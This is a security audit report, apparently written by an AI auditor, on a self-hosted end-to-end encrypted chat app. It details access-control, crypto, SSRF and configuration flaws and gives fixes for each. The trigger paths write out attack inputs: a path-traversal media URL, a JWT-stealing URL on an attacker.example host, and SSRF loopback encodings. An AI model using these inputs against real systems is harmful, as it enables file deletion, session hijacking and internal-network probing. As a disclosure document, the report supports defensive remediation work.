# Fireplace — Security & Quality Audit · Findings Report

**Branch:** `audit/full-review` · **Auditor:** Claude (Opus 4.8) · **Date:** 2026-06-14
**Status:** COMPLETE — full codebase audited (see `AUDIT-PROGRESS.md` coverage statement).
**Totals:** 0 Critical · 4 High · 7 Medium · 14 Low · 4 Info. See SEVERITY TOTALS + PRIORITIZED
ACTION LIST at the bottom.

Severity = impact × exploitability. Confidence = how sure I am the code behaves as described
(High = read + traced; Med = read, some runtime assumption; Low = needs runtime confirmation).

Each finding: `id · title · severity · confidence · category · location · evidence · impact · fix`.

> NOTE: This file is built incrementally. The **prioritized action list, severity totals, and
> strengths section live at the bottom** and are finalized in Phase 3.

---

## CRITICAL
_(none yet)_

---

## HIGH

### H-01 · IDOR: `getMessages` returns ANY conversation's history with no membership check
- **Category:** Security — broken access control (IDOR)
- **Confidence:** High (read + traced both layers)
- **Location:** `backend/src/chat/services/chat-message.service.ts:150-191` (`handleGetMessages`)
  → `backend/src/messages/messages.service.ts:76-109` (`findByConversation`)
- **Evidence:** The gateway handler validates only `GetMessagesDto` then calls
  `this.messagesService.findByConversation(data.conversationId, data.limit, data.offset, userId)`.
  In `findByConversation`, the 4th parameter is named `hiddenByUserId` and is used **only** to
  filter out "deleted-for-me" rows — the query WHERE clause is purely
  `where: { conversation: { id: conversationId } }`. There is **no check that the caller is
  `userOne`/`userTwo` of that conversation** (contrast every sibling handler — `markConversationRead`,
  `deleteMessage`, `clearChatHistory` — which all verify membership). `conversation.id` is a
  sequential integer PK (`conversation.entity` `@PrimaryGeneratedColumn`), so it is trivially
  enumerable.
- **Trigger path:** Authenticate → open socket (`socketReady`) → `emit('getMessages',
  { conversationId: N, limit: 50, offset: 0 })` for arbitrary `N` → receive `messageHistory`
  with that conversation's messages (sender ids, timestamps, `messageType`, `mediaUrl`,
  `deliveryStatus`, reactions, reply snapshots, any link-preview fields, and — for any message a
  client stored without `encryptedContent` — the **plaintext `content`**).
- **Impact:** Cross-account metadata disclosure for the entire user base: who messages whom,
  when, how often, with what media. Message bodies stay protected **only because** clients E2E-
  encrypt them (the server does not enforce encryption — `handleSendMessage` stores
  `data.encryptedContent ? '[encrypted]' : data.content`), so any non-E2E content is fully
  readable. This defeats the metadata-privacy expectation of an E2E messenger.
- **Fix:** Enforce membership before serving history. Either (a) load the conversation and verify
  `userOne.id === userId || userTwo.id === userId` in `handleGetMessages` (mirror
  `handleMarkConversationRead:264`), or preferably (b) push the check into a dedicated
  `findByConversationForParticipant(conversationId, userId, …)` that adds the participant predicate
  to the SQL so it cannot be forgotten by future callers. Add a regression test that a non-member
  `getMessages` returns empty/`Unauthorized`.

### H-04 · Access-token (JWT) exfiltration via attacker-controlled media URL
- **Category:** Security — broken access control / credential disclosure (SSRF-adjacent)
- **Confidence:** High (traced sender→envelope→render→header)
- **Location:** `frontend/lib/services/api_service.dart:355-366` (`fetchMediaBytes`); source of
  `mediaUrl` `frontend/lib/providers/messaging/messaging_provider.decrypt.dart:607-617`
  (`parsed.mediaUrl` from the E2E envelope); callers
  `widgets/message/image_message_content.dart:48-55`, `gif_message_content.dart:70`,
  `file_message_content.dart:46-48`, `widgets/audio/playback_controller.dart:188-190,258-261`.
- **Evidence:** `fetchMediaBytes(url, token)` attaches `Authorization: Bearer <token>` whenever
  the resolved URL **contains the substring `/media/msgs/`** — it does **not** check that the host
  equals the backend (`baseUrl`) origin. The `url` is `message.mediaUrl`, which on the receive
  side is taken from the **decrypted E2E envelope** (`parsed.mediaUrl`), a value the **sender fully
  controls and the server never validates** (server-side `MEDIA_URL_REGEX` only constrains the
  separate DB field, not the envelope inside `encryptedContent`). The decrypt path validates
  `linkPreviewImageUrl` for SSRF but **not `mediaUrl`**. `rewriteLoopbackMediaUrl` only rewrites
  `localhost`/`127.0.0.1`, leaving foreign hosts untouched. The image widget auto-loads bytes on
  display (`_loadDecryptedBytes` in init/`didUpdateWidget`).
- **Trigger path:** Attacker (a friend) sends an `IMAGE`/`VOICE`/`FILE`/`GIF` message whose envelope
  sets `mediaUrl = "https://attacker.example/media/msgs/x.bin"`. Victim opens the chat → the media
  widget calls `fetchMediaBytes` → because the URL contains `/media/msgs/`, the victim's **access
  JWT is sent in the `Authorization` header to `attacker.example`**, which logs it.
- **Impact:** Full account takeover for the access-token lifetime (24h): the stolen JWT authorizes
  REST + WebSocket (and per **M-05** keeps a live socket even after a password change). One of the
  highest-impact findings — exploitable by any contact with no user interaction beyond opening a chat.
- **Fix:** Only attach the `Authorization` header when the resolved URL's **origin equals
  `baseUrl`'s origin** (parse both with `Uri` and compare scheme+host+port — not a substring).
  Additionally, validate `parsed.mediaUrl` on decrypt the same way `linkPreviewImageUrl` is
  validated (restrict to the backend origin or Cloudinary; reject anything else before it ever
  reaches a fetch). Never send credentials cross-origin.

### H-03 · No identity-key pinning / change-detection → server-assisted MITM defeats E2E
- **Category:** Security — E2E / crypto integrity
- **Confidence:** High (code), with explicit adversary caveat below
- **Location:** `frontend/lib/services/encryption/signal_stores.dart:133-141`
  (`isTrustedIdentity`); `frontend/lib/services/encryption_service.dart:158-162` (`buildSession`)
- **Evidence:** `isTrustedIdentity()` is overridden to **always** `saveIdentity(address, key)` and
  `return true` — regardless of whether a *different* identity was previously stored for that peer
  (comment: "we don't verify fingerprints manually, so TOFU always wins"). `buildSession` also
  pre-saves whatever `identityPublicKey` the server returns before `processPreKeyBundle`. So
  libsignal's built-in trust-on-change protection is disabled and **any identity key the server
  serves is accepted silently**, at first contact *and on every rebuild*. There is no
  safety-number/QR verification flow and no "peer's security number changed" warning
  (`getIdentityFingerprint` exists but is display-only — nothing compares peer fingerprints).
- **Adversary / trigger:** The backend is the key directory (`fetchPreKeyBundle` returns the
  identity). A malicious or compromised server (or anyone who can MITM that fetch) returns an
  attacker-controlled identity + pre-key bundle for the target peer → the victim builds a session
  with the attacker's keys and encrypts to the attacker. Forcing a rebuild
  (`sessionRebuildNeeded`, also server-relayed) re-triggers this for an *existing* contact.
- **Impact:** Defeats the product's central guarantee — confidentiality against the server. The
  server can transparently MITM any conversation; users get no signal that it happened. (Caveat:
  this is partly inherent to any server-directory E2E system, and a self-hosted operator is often
  trusted; but the *complete absence* of pin-and-warn + verification is what makes it exploitable
  with no detection.)
- **Fix:** Implement TOFU pin-and-warn: in `isTrustedIdentity`, if a *different* key is already
  stored for the address, return `false` (or surface a blocking "safety number changed" state) and
  require explicit user re-acceptance — do not silently overwrite. Add a safety-number/fingerprint
  comparison UI in Privacy & Safety (compare both peers' `getIdentityFingerprint`). Gate automatic
  re-key acceptance behind that.

### H-02 · Path traversal → arbitrary file deletion via crafted `mediaUrl`
- **Category:** Security — path traversal / data destruction
- **Confidence:** High (regex + sink traced); Med on blast radius (depends on process UID)
- **Location:** validation `backend/src/chat/dto/chat.dto.ts:19-26,62-67` (`MEDIA_URL_REGEX`);
  sink `backend/src/media/media-cleanup.service.ts:23-32` → `local-storage.service.ts:84-96`
  (`extractPublicId` + `deleteFile`); triggers `chat-message.service.ts:421-423` (delete-for-
  everyone) and `messages/message-cleanup.service.ts:20-50` (per-minute expiry cron).
- **Evidence:** `MEDIA_URL_REGEX` is `^(https://res\.cloudinary\.com/…|${origin}/media/.+)`. The
  self-hosted branch ends in `/media/.+`, and `.+` matches `/` and `.` — so
  `https://<MEDIA_BASE_URL host>/media/../../../etc/passwd` **passes** `SendMessageDto.mediaUrl`
  validation. The value is stored verbatim on the message. On deletion,
  `deleteMediaFile` only checks `mediaUrl.startsWith(this.mediaBaseUrl)` (true), then
  `extractPublicId` does `mediaUrl.replace(\`${baseUrl}/media/\`, '')` → `../../../etc/passwd`,
  and `deleteFile` runs `fs.unlink(path.join(this.mediaDir, '../../../etc/passwd'))`.
  `path.join` normalizes the `..` segments, so the unlink target escapes `MEDIA_DIR`.
- **Trigger path:** Authenticated attacker (friends with anyone) → `emit('sendMessage', {
  recipientId, messageType: 'FILE', mediaUrl: 'https://<host>/media/../../<target>',
  encryptedContent: '…', expiresIn: <min> })`. Then either delete-for-everyone (sender is
  allowed) or just wait ≤60s for the expiry cron — both call `deleteMediaFile` on the crafted URL
  and unlink the traversed path. The target file need not exist under `MEDIA_DIR`.
- **Impact:** Arbitrary file deletion with the backend process's privileges (the
  `node:20-alpine` image runs as **root** unless a `USER` is set — verify in I1). At minimum:
  destroy any user's media; potentially delete app files / mounted-volume contents → DoS / data loss.
- **Fix:** Reject path-traversal in `mediaUrl` at validation — tighten the regex to the actual
  filename shape (`/media/(avatars|msgs)/[A-Za-z0-9_-]+\.(bin|jpg|png)$`, anchored with `$`,
  no `.`/`/` wildcard). Defense in depth at the sink: after `extractPublicId`, reject any
  `publicId` containing `..` or a leading `/`, and verify `path.resolve(mediaDir, publicId)`
  stays within `path.resolve(mediaDir)` before `unlink`. Run the container as a non-root `USER`.

---

## MEDIUM

### M-01 · Refresh-token rotation is non-atomic and has no reuse/theft detection (365-day TTL)
- **Category:** Security — auth/session lifecycle
- **Confidence:** High (code), Med (race window in prod)
- **Location:** `backend/src/auth/refresh-tokens.service.ts:46-62` (`consumeAndRotate`)
- **Evidence:** `consumeAndRotate` does `findOne({tokenHash})` → `remove(row)` → `createToken()`
  as three separate awaited steps, not in a single transaction/atomic `DELETE … RETURNING`.
  Two concurrent refreshes presenting the **same** token both `findOne` the row, both `remove`
  (the second deletes 0 rows, no error), and both mint a fresh token — a double-spend. There is
  also **no rotation-reuse detection**: once a token is rotated away, replaying the old token
  just 401s; a stolen-then-rotated token cannot be distinguished from a race, so theft is never
  detected and the family is never revoked. Tokens live **365 days** sliding (`REFRESH_TOKEN_TTL_DAYS = 365`).
- **Impact:** A stolen refresh token is usable for up to a year and silently rotates; the legit
  user and attacker can both hold valid tokens after a single race. No alarm on reuse.
- **Fix:** Make consume atomic — `DELETE FROM refresh_tokens WHERE token_hash=$1 AND expires_at>NOW() RETURNING user_id`
  (the same atomic-claim pattern already used for OTPs in `key-bundles.service.ts:72`). Add
  reuse detection: keep a short grace/`replacedBy` chain and on reuse of a consumed token,
  `revokeAllForUser`. Consider shortening TTL or adding idle-timeout.

### M-02 · `DELETE /users/fcm-token` is not scoped to the caller (cross-user push DoS)
- **Category:** Security — broken access control (IDOR-style)
- **Confidence:** High (code), Low (real-world: needs victim token knowledge)
- **Location:** `backend/src/users/users.controller.ts:145-150` → `fcm-tokens.service.ts:19-21`
- **Evidence:** `removeFcmToken` calls `this.fcmTokensService.removeByToken(dto.token)` which runs
  `delete({ token })` with **no `userId` filter**. Any authenticated user who supplies an
  arbitrary FCM token string deletes that row. Contrast the correctly-scoped web-push twin
  `removeWebPushSubscription` → `removeByEndpointForUser(req.user.id, dto.endpoint)` (`:178`).
- **Impact:** An attacker who learns a victim's FCM token can unregister it, silently disabling
  the victim's native push. Exploitability gated by token secrecy (FCM tokens are opaque/long).
- **Fix:** Add a user-scoped delete `removeByTokenForUser(userId, token)` (mirror the web-push
  method) and call it with `req.user.id`. Same defense-in-depth applies to the `upsert` path
  (consider not silently re-owning a token across users without a confirmation signal).

### M-03 · `synchronize` is gated on raw `process.env.NODE_ENV` — prod schema auto-sync if unset
- **Category:** Security/Reliability — data integrity / config
- **Confidence:** Med (depends on deploy env — to confirm in I1)
- **Location:** `backend/src/app.module.ts:76` (`synchronize: process.env.NODE_ENV !== 'production'`)
- **Evidence:** The TypeORM `synchronize` flag reads `process.env.NODE_ENV` **directly**, bypassing
  the validated `EnvironmentVariables` (whose `NODE_ENV` *defaults* to `Development`). If the
  production container starts without `NODE_ENV=production` exported, `synchronize` is **true** in
  prod, letting TypeORM auto-alter the live schema from entity drift (silent column drops/renames).
- **Impact:** Potential production data loss / schema corruption on deploy if the env var is missing.
- **Fix:** Confirm `deploy.sh`/compose set `NODE_ENV=production` (verify in I1). Independently,
  derive `synchronize` from the validated `ConfigService` value and/or default `NODE_ENV` to
  `production` for safety, and adopt real migrations (CLAUDE.md already notes "no migrations").

---

### M-04 · Link-preview SSRF filter is bypassable (alt IP encodings) + no resolve-and-pin
- **Category:** Security — SSRF
- **Confidence:** High (encoding bypass), Med (internal-service reachability/impact)
- **Location:** `backend/src/chat/services/link-preview.service.ts:3-43,85-155`
- **Evidence:** `PRIVATE_IP_RE` is matched against the URL **hostname string**. It blocks literal
  dotted-decimal private ranges and `localhost`, but not alternative encodings of the same
  addresses that `new URL()` preserves verbatim as the hostname:
  - `http://2130706433/` → host `2130706433` (= `127.0.0.1` in decimal) — not matched → fetched.
  - `http://0x7f.1/`, octal `http://0177.0.0.1/`, IPv4-mapped IPv6 `http://[::ffff:7f00:1]/`,
    and `0.0.0.0` (the `0.` block is absent) similarly slip through.
  The code comment already concedes the **DNS-rebinding residual** (a public hostname that
  resolves to a private IP isn't caught because there is no resolve-and-pin). The path is
  reachable: any user can send a **plaintext** `TEXT` message (no `encryptedContent`) to a
  friend; `handleSendMessage` → `ChatLinkPreviewService.fetchAndEmitIfNeeded` → `fetchPreview`
  then fetches the attacker URL from the server. **More directly:** `POST /messages/link-preview`
  (`messages.controller.ts:16-26`, JWT-guarded, 30/min) calls `fetchPreview(body.text)` with
  arbitrary text and **returns the result to the caller** — so any authenticated user triggers the
  fetch with no friendship/message needed, and the `og:title`/`og:image` exfil channel is direct.
- **Impact:** Server-side blind/semi-blind SSRF to loopback and internal hosts; `og:title`/
  `og:image` are returned to the client, giving limited data exfil from internal HTTP services.
  Cloud metadata (`169.254.169.254`) is reachable by decimal/hex encoding, though GCP's v1
  metadata requires a `Metadata-Flavor` header (not sent) which mitigates that specific target.
- **Fix:** After parsing, resolve the hostname (`dns.lookup`, all addresses) and run every
  resolved IP through a **binary** private/reserved-range check (not a string regex) — covering
  IPv4 `0.0.0.0/8`, `127/8`, RFC1918, `169.254/16`, CGNAT `100.64/10`, IPv6 `::1`, `fc00::/7`,
  `fe80::/10`, and IPv4-mapped IPv6 — then **pin** the connection to that validated IP (or use a
  vetted SSRF-filtering fetch library). Re-resolve+re-check on every redirect hop.

### M-05 · WebSocket auth skips the `passwordChangedAt` token-invalidation check
- **Category:** Security — auth/session lifecycle
- **Confidence:** High
- **Location:** `backend/src/chat/chat.gateway.ts:79-110` (`handleConnection`)
- **Evidence:** The socket handshake does `this.jwtService.verify(token)` then
  `usersService.findById(payload.sub)` — verifying only signature + expiry. The REST
  `JwtStrategy.validate` additionally rejects tokens whose `iat <= passwordChangedAt`
  (`jwt.strategy.ts:35-39`); the WS path has **no equivalent check**. After a password reset
  (which sets `passwordChangedAt` and revokes refresh tokens), a previously-issued, still-unexpired
  **access token remains fully usable over WebSocket** until the 24h JWT TTL lapses.
- **Impact:** Password change does not cut off a compromised session on the most-used surface;
  attacker keeps a live, fully-privileged chat socket up to the access-token lifetime. Undermines
  the documented "JWT invalidation after password change" guarantee.
- **Fix:** Mirror the REST check in `handleConnection` (reject `payload.iat <= floor(passwordChangedAt/1000)`)
  and forcibly disconnect that user's live sockets on `resetPassword`.

### M-06 · `findByConversation` hidden-path loads unbounded rows on deep pagination
- **Category:** Performance / DoS
- **Confidence:** High
- **Location:** `backend/src/messages/messages.service.ts:94-109`
- **Evidence:** When `hiddenByUserId != null` (the normal `getMessages` path — the caller's id is
  always passed), pagination is in memory: `fetchLimit = limit*3 + offset + 50`, `take: fetchLimit,
  skip: 0` loads from the newest row up to `fetchLimit` every call (with `sender`/`replyTo`/
  `replyTo.sender` joins), then slices. As `offset` grows, each page re-fetches an ever-larger set
  into Node memory; the old 500-row cap was explicitly removed.
- **Impact:** O(offset) DB reads + memory per request on long conversations; repeated large-`offset`
  requests are an easy memory/CPU amplification vector.
- **Fix:** Push the "deleted-for-me" filter into SQL (reuse the `NOT LIKE` predicate from
  `countUnread*`/`getUnreadSummary`) so DB-level `take/skip` works without over-fetch; restore an
  upper bound on `fetchLimit`.

### M-07 · Production deploy runs the backend with `NODE_ENV=development`
- **Category:** Security / data integrity — config
- **Confidence:** High (compose config), Med (actual VM env not directly observed)
- **Location:** `docker-compose.yml:38` (`NODE_ENV: development`); `docker-compose.web.yml:10-13`
  (backend `extends` that service); `deploy.sh:40-45` (prod build/up uses these compose files;
  no `NODE_ENV=production` exported; repo `.env` does not set it).
- **Evidence:** The only backend service definition hardcodes `NODE_ENV: development`, and the web
  compose extends it. `deploy.sh` runs `docker compose build/up backend` without overriding
  `NODE_ENV`. So unless the VM carries an unversioned override, production runs in dev mode, which
  flips several `process.env.NODE_ENV !== 'production'` gates **on** in prod:
  `synchronize: true` (TypeORM auto-alters the live schema — see **M-03**, now concrete →
  silent schema drift/data loss), the CORS dev-bypass that allows any `localhost`/`192.168.*`/`10.*`
  origin (`main.ts:34-47`, `chat.gateway.ts:40-49`), verbose `debug`/`verbose` logging, and the
  dev-secret fallbacks (`local-storage`/`media` dev `sendFile` path serving files directly instead
  of via nginx `X-Accel-Redirect`).
- **Impact:** Production schema auto-sync (data-loss risk on entity drift), looser CORS, verbose
  logs (the `[push-skip]`/audit lines leak usernames + conversation graph at volume), and the dev
  media-serve branch bypassing nginx's `internal` protection.
- **Fix:** Set `NODE_ENV=production` for the deployed backend (compose env, `.env`, or a prod
  override file) and verify via `/version` + a startup log. Adopt real TypeORM migrations and force
  `synchronize: false` in prod regardless of `NODE_ENV`.

---

## LOW

### L-11 · Backend container runs as root (amplifies H-02)
- **Category:** Security — container hardening
- **Confidence:** High
- **Location:** `backend/Dockerfile` (no `USER` directive; `node:20-alpine` defaults to root)
- **Evidence:** The production image never drops privileges, so `node dist/main.js` runs as UID 0.
- **Impact:** Any file-write/delete primitive in the app (notably **H-02** path-traversal unlink)
  executes as root inside the container — able to remove app code, `node_modules`, and the mounted
  `media_storage` volume. Also general blast-radius increase for any RCE-class bug.
- **Fix:** Add a non-root `USER node` (the alpine node image ships a `node` user) after copying
  artifacts; ensure `MEDIA_DIR` is writable by that user.

### L-12 · Web app served by nginx with no CSP / security headers
- **Category:** Security — hardening
- **Confidence:** High
- **Location:** `frontend/nginx.conf` (static `location /` serves the SPA; no
  `add_header Content-Security-Policy/X-Frame-Options/Referrer-Policy/...`)
- **Evidence:** `helmet()` headers apply only to backend-proxied responses; the Flutter web bundle
  and `index.html` are served directly by nginx with no CSP, `X-Frame-Options`, `Referrer-Policy`,
  or `Permissions-Policy`.
- **Impact:** No clickjacking protection (framing) and no CSP defense-in-depth for the PWA (which
  handles E2E plaintext in the browser). Raises the impact of any future DOM-injection bug.
- **Fix:** Add `X-Frame-Options: DENY` (or `frame-ancestors 'none'` via CSP), a tailored CSP, and
  `Referrer-Policy: no-referrer` to the nginx server block; keep `X-Content-Type-Options: nosniff`.

### L-13 · nginx `client_max_body_size 11m` contradicts the 20MB media limit
- **Category:** Reliability / correctness
- **Confidence:** High
- **Location:** `frontend/nginx.conf:7`; vs `media.controller.ts:35` (21MB) and
  `MediaCryptoService.maxBytes` (20MB)
- **Evidence:** nginx caps request bodies at 11MB server-wide, so media uploads between ~11 and
  20MB (which the app/backend explicitly allow) are rejected by nginx with `413` before reaching
  the backend.
- **Impact:** Larger voice/image/file sends silently fail in production behind nginx.
- **Fix:** Raise `client_max_body_size` to match the backend cap (e.g. `22m`).

### L-08 · Several state-changing WS handlers have no per-event throttle
- **Category:** Reliability / DoS
- **Confidence:** High
- **Location:** `backend/src/chat/chat.gateway.ts` — `messageDelivered` (147), `markConversationRead`
  (160), `typing` (205), `recordingVoice` (233), `acceptFriendRequest` (412),
  `rejectFriendRequest` (425), `unblockUser` (475), `uploadKeyBundle` (254) carry no
  `@UseGuards(WsThrottlerGuard)`/`@Throttle`.
- **Evidence:** Most WS events are individually throttled; the above are not. `markConversationRead`
  and `messageDelivered` write to the DB and can trigger push scheduling; `uploadKeyBundle` upserts
  a row per call. The global HTTP `ThrottlerModule` does not apply without the WS guard.
- **Impact:** A connected client can spam these for DB-write / push churn (amplification) or hammer
  read-receipt updates. Bounded by one socket but an easy abuse surface.
- **Fix:** Add `@UseGuards(WsThrottlerGuard) @Throttle(...)` to every state-changing handler.

### L-09 · `SendMessageDto.messageType` is `@IsString()` not `@IsIn(MessageType)`
- **Category:** Correctness / reliability
- **Confidence:** High
- **Location:** `backend/src/chat/dto/chat.dto.ts:57-58`; sink `messages.service.ts:42-55`
- **Evidence:** `messageType` accepts any string and `create` passes it into the `messageType` **PG
  enum** column; an out-of-enum value makes the INSERT throw. `handleSendMessage` does not wrap
  `messagesService.create` in try/catch, so the send fails with an unhandled error and the sender
  gets no `messageSent`/`error` ack.
- **Impact:** Minor — malformed client value yields a confusing failed send + unhandled rejection
  path. No data corruption (DB enum rejects bad values).
- **Fix:** `@IsIn(['TEXT','PING','IMAGE','VOICE','GIF','FILE'])`; wrap `create` to emit a clean error.

### L-14 · Auth tokens stored in plain SharedPreferences (localStorage on web; 365-day refresh)
- **Category:** Security — token storage
- **Confidence:** High
- **Location:** `frontend/lib/providers/auth_provider.dart:84-86,145-147` (`jwt_token`,
  `refresh_token` via `SharedPreferences`)
- **Evidence:** Both the access JWT and the **365-day** refresh token (see M-01) are persisted in
  `SharedPreferences` — which is `localStorage` on web (readable by any same-origin script) and
  plaintext prefs on mobile (not the OS keystore; contrast the E2E keys' `DualStorage`/secure
  storage). No httpOnly cookie is used.
- **Impact:** With **L-12** (no CSP) any XSS/script-injection in the PWA exfiltrates a year-long
  refresh token → durable account takeover. On a rooted/compromised device, mobile prefs are
  readable too.
- **Fix:** Store the refresh token in an httpOnly, Secure, SameSite cookie (or at least the mobile
  OS keystore via `flutter_secure_storage`), shorten its TTL/add idle expiry (M-01), and add a CSP
  (L-12) to shrink the XSS exfil surface.

### L-10 · Signed pre-key (id 0) is generated once and never rotated
- **Category:** Security — E2E / crypto hygiene
- **Confidence:** High
- **Location:** `frontend/lib/services/encryption_service.dart:86-88` (`_generateKeys`);
  `signal_stores.dart:216-224` (only `signedPreKeyId=0` ever used)
- **Evidence:** A single signed pre-key with `id=0` is created at install and reused indefinitely;
  there is no periodic rotation (Signal rotates signed pre-keys ~weekly and retires the old one).
  `loadSignedPreKeys` hardcodes `[loadSignedPreKey(0)]`.
- **Impact:** Reduced forward secrecy — compromise of the long-lived signed-pre-key private key
  exposes the X3DH shared secret for *all* sessions ever bootstrapped from it. Lower severity
  because per-message keys still ratchet, but it widens the blast radius of a key-store compromise.
- **Fix:** Rotate the signed pre-key on a schedule (new id, upload, keep the previous one briefly
  for in-flight bundles), matching Signal's signed-pre-key lifecycle.

### L-01 · Hardcoded `DEV_JWT_SECRET` fallback in JWT strategy
- **Category:** Security — secrets
- **Confidence:** High (code), mitigated by env validation
- **Location:** `backend/src/auth/strategies/jwt.strategy.ts:7,17-18`
- **Evidence:** `const secret = configService.get('JWT_SECRET') || DEV_JWT_SECRET;` with
  `DEV_JWT_SECRET = 'super-secret-dev-key'` committed in source. Mitigated because
  `env.validation.ts` makes `JWT_SECRET` required (`@MinLength(32)`, no default) and boot fails
  if absent — so the fallback is effectively dead given validation runs.
- **Impact:** If env validation were ever disabled/bypassed, JWTs would be signed/verified with a
  public constant → trivial token forgery. Today: latent.
- **Fix:** Remove the fallback; let it throw if `JWT_SECRET` is missing (fail-closed).

### L-02 · Login allows username/timing enumeration
- **Category:** Security — info disclosure
- **Confidence:** High
- **Location:** `backend/src/auth/auth.service.ts:28-50`
- **Evidence:** When no user matches, the code throws *before* any `bcrypt.compare`, so the
  not-found path is measurably faster than the wrong-password path (timing oracle for account
  existence). Separately, the `Multiple users found, please use username#tag` message
  (`:38`) confirms ≥2 accounts share a username. (Note: see L-03 — multi-user-per-username may be
  unreachable, making that branch dead, but the timing oracle remains.)
- **Impact:** Account-existence enumeration; aids credential-stuffing targeting.
- **Fix:** Always run a dummy `bcrypt.compare` against a constant hash on the not-found path to
  equalize timing; return a generic `Invalid credentials` in all cases.

### L-03 · `create()` enforces global username uniqueness — tag/disambiguation logic is dead
- **Category:** Correctness / code quality (design inconsistency vs documented model)
- **Confidence:** High
- **Location:** `backend/src/users/users.service.ts:40-44`
- **Evidence:** `create` rejects registration when `findByUsername(username).length > 0`, i.e. the
  first account to claim a username blocks all others. Yet the DB unique constraint is on
  `(username, tag)` and login (`auth.service.ts:30-39`) and the `#tag` UI exist to disambiguate
  multiple same-username accounts — which can never occur. The tag-collision retry loop
  (`users.service.ts:47-56`) and login's "multiple users" branch are therefore unreachable.
- **Impact:** No security impact; misleading design, dead code, wasted DB round-trips, and a
  product decision (are duplicate usernames allowed?) that the code and schema disagree on.
- **Fix:** Decide intent. If usernames are globally unique, drop the tag system / simplify login.
  If `username#tag` is the identity, remove the `findByUsername().length>0` precheck and rely on
  the `(username, tag)` unique constraint.

### L-04 · `deleteAccount` does not purge the user's Secret Notes
- **Category:** Data lifecycle
- **Confidence:** High
- **Location:** `backend/src/users/users.service.ts:122-178`
- **Evidence:** The cascade deletes media, fcm/web-push tokens, key bundles, conversations,
  messages, friend-requests and the user, but never touches `secret_notes` (which store a
  plain `creatorId` with no FK — see schema notes). Orphaned notes remain until their
  TTL/`deleteExpiredNotes` cron.
- **Impact:** Minor — notes self-destruct on expiry (≤12h) anyway; brief data-remanence after
  account deletion.
- **Fix:** Add `secretNotesService.deleteByCreatorId(userId)` to the deletion path.

### L-05 · Pre-key bundle fetch has no friendship gate; per-pair limit still allows OTP depletion
- **Category:** Security/Reliability — E2E (prekey exhaustion DoS)
- **Confidence:** Med
- **Location:** `backend/src/chat/services/chat-key-exchange.service.ts:67-128`
- **Evidence:** Any authenticated user may `fetchPreKeyBundle(anyUserId)`; each fetch atomically
  consumes one one-time pre-key. The only throttle is a per-`(requester,recipient)` 750ms
  interval — one attacker can drain a target's ~20 OTPs in ~15s, and multiple attacker accounts
  bypass the per-pair key entirely. (Bundles are public by Signal design, so this is a depletion/
  forward-secrecy concern, not a key-disclosure one; signed-prekey fallback keeps messaging
  functional.)
- **Impact:** Reduced forward secrecy for initial messages to a targeted user during a depletion
  window; not a confidentiality break.
- **Fix:** Consider a global per-recipient consumption cap, faster replenish prompts, or gating
  bundle fetch on an existing/forming conversation. Low priority — matches Signal-server norms.

### L-07 · Encrypted media (`/media/msgs/:filename`) is access-controlled only by UUID, not ownership
- **Category:** Security — broken access control (capability-by-obscurity)
- **Confidence:** High
- **Location:** `backend/src/media/media.controller.ts:100-111`; `local-storage.service.ts:98-108`
- **Evidence:** `GET /media/msgs/:filename` is `JwtAuthGuard`-protected and path-traversal-safe
  (`path.basename`), but performs **no check that the caller participates in the conversation that
  owns the blob**. Any authenticated user who knows a `msgs/<uuid>.bin` filename can download it.
  Filenames are `randomUUID()` (v4, unguessable), so this is normally safe — **but H-01 leaks
  `mediaUrl` for arbitrary conversations**, turning "unguessable" into "enumerable," so an attacker
  can pull every conversation's encrypted media blobs. Blob *contents* stay protected by AES-GCM
  E2E (keys only in the message envelope), so this is confidentiality-by-encryption, not by authz.
- **Impact:** With H-01, bulk download of all users' encrypted media (size/existence metadata;
  ciphertext only). Standalone: low (UUID secrecy).
- **Fix:** Bind blobs to conversations and authorize on serve (look up the owning message/
  conversation, require the caller be a participant). Fixing H-01 also closes the enumeration path.

### L-06 · `handleRequestSessionRebuild` relays to any user with no conversation check
- **Category:** Security — E2E (nuisance/DoS)
- **Confidence:** Med
- **Location:** `backend/src/chat/services/chat-key-exchange.service.ts:152-177`
- **Evidence:** Relays `sessionRebuildNeeded {fromUserId: requesterId}` to any online
  `dto.recipientId` with no friendship/conversation validation. `fromUserId` is forced to the
  authenticated `requesterId` (can't be spoofed), so an attacker can only induce a victim to
  rebuild the session *with the attacker* — but can do so repeatedly. No event-specific rate limit
  beyond the global WS throttler (to confirm in B5).
- **Impact:** Low — bounded to attacker↔victim session churn; possible nuisance.
- **Fix:** Require an existing conversation/friendship before relaying; add a per-pair cooldown.

---

## INFO / OBSERVATIONS

### I-01 · bcrypt 72-byte truncation vs 128-char max password
- `register.dto.ts:20` / `login.dto.ts:13` allow 128-char passwords; bcrypt only hashes the first
  72 bytes (silent truncation). Cost factor 10 (`users.service.ts:46,114`). Both acceptable;
  consider pre-hashing (SHA-256→base64) before bcrypt if longer effective passwords are desired.

### I-02 · Audit log records usernames/identifiers
- `auth.service.ts` and `users.service.ts` log `identifier`/`username` on auth events (PII in logs).
  No passwords/tokens logged (good). Consider hashing/omitting identifiers if logs are retained.

---

### I-03 · Dependency / supply-chain notes (static review — no live audit run)
- Backend deps are modern: NestJS 11, `bcrypt@6`, `typeorm@0.3.28`, `multer@2.0.2` (the maintained
  2.x line, not the vulnerable 1.x), `helmet@8`, `web-push@3.6.7`, `firebase-admin@13`,
  `class-validator@0.14`. No obviously-abandoned or known-CVE packages spotted by version, but no
  live `npm audit` was run in this pass — **CI does not run `npm audit` / `flutter pub outdated`**
  (`.github/workflows/ci.yml`), so there is no automated dependency-vulnerability gate.
- Frontend E2E relies on **`libsignal_protocol_dart@0.7.4`** — a community Dart re-implementation of
  the Signal protocol (not the official library). The decrypt-regression history in CLAUDE.md traces
  partly to its behavior; for a product whose security rests on it, this is a real assurance/
  supply-chain consideration. Pin it, track upstream, and keep the two-party integration tests.
- **Fix:** Add `npm audit --omit=dev` (fail on high) and a Dart advisory check to CI; periodically
  review `flutter pub outdated`.

### I-04 · `_decryptedContentCache` (in-RAM) is unbounded per session
- `frontend/lib/providers/encryption_provider.dart:29` — grows one `MessageModel` per decrypted id
  for the session lifetime (the *persisted* cache is capped at 2000, this RAM map is not). Cleared
  on logout/fresh-connect. Minor memory growth in very long sessions.

## SEVERITY TOTALS
| Severity | Count | IDs |
|---|---|---|
| Critical | 0 | — |
| High | 4 | H-01 H-02 H-03 H-04 |
| Medium | 7 | M-01 … M-07 |
| Low | 14 | L-01 … L-14 |
| Info | 4 | I-01 … I-04 |

---

## PRIORITIZED ACTION LIST (highest first)

